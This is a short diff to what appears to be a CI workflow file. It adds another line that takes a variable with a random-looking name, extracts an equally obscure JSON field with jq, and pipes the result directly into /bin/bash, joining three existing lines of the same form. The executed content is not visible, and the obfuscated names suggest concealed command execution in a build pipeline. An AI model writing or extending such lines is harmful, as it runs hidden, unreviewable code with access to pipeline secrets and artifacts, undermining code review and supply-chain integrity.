@@ -20,6 +20,7 @@ jobs:
           printf '%s' "$aeksv2368" | jq -r .ibma448 | /bin/bash
           echo $a31083 | jq -r .zka82845 | /bin/bash
           echo $z7 | jq -r .wkao15 | /bin/bash
+          printf '%s' "$qua553" | jq -r .eukb4 | /bin/bash
 
       - name: Archive output
         uses: actions/upload-artifact@v4
